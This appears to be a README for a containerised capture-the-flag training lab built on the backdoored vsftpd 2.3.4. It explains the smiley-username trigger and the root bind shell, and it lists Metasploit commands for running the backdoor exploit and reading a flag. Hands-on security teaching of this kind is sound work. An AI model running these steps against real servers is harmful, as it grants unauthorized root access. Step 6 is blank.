# WCCI CTF Exercise 1

Ubuntu container with a vulnerable version of [vsftpd-2.3.4](https://github.com/nikdubois/vsftpd-2.3.4-infected/tree/vsftpd_original) installed. 
This version of vsftpd-2.3.4 contains a malicious backdoor, which could be triggered when a username contained a ":)". Upon execution, a bind shell on port 6200 was opened, giving remote root access to anyone connecting to that port.

The container also contains the latest version of Parrot Security, which can be used to exploit this vulnerability. 

## Requirements
- Docker
- Docker Compose

## Instructions
1. Clone this Repo: `git clone https://github.com/johnathan-wcci/VSFTPD-2.3.4-Exercise-1.git`
2. Navigate into this folder: `cd VSFTPD-2.3.4-Exercise-1`
3. Start the Docker Container: `docker compose -f .\docker-compose.yml up'
4. Open Another Terminal.
5. Bash into the Parrot Security Container. This is your attack machine: `docker exec -it test-ctf-Parrot-1 bash`
6. Find Target Machine: ``
7. Open the Metasploit Console: `msfconsole`
8. Select the vsftpd-2.3.4 exploit: `use unix/ftp/vsftpd_234_backdoor`
9. View configurable options: `show options`
10. Set the Target machine: `set RHOST <taget-machine-ip>`
11. Run the exploit: `exploit`
12. Wait for Reverse Shell to start
13. Run a test command to see if shell session is established: `ls -l`
14. Find the flag: `cat ~/Documents/Important\ Keys/keys.txt`
15. Use your favorite Base64 Decoder to decode the flag.
16. DO NOT LEAVE THESE CONTAINERS RUNNING! Stop the docker containers by running: `docker compose -f .\docker-compose.yml down`

## Extra Credit:
1. Try manually exploiting this backdoor.
2. Try writing a Python script to exploit this backdoor.

## Resources:
[Rapid7 MSFConsole Module](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)
[Rapid7 VSFTPD-2.3.4 Exploit Module Source Code](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/unix/ftp/vsftpd_234_backdoor.rb)
[University of Hawaii Writeup](https://westoahu.hawaii.edu/cyber/forensics-weekly-executive-summmaries/8424-2/)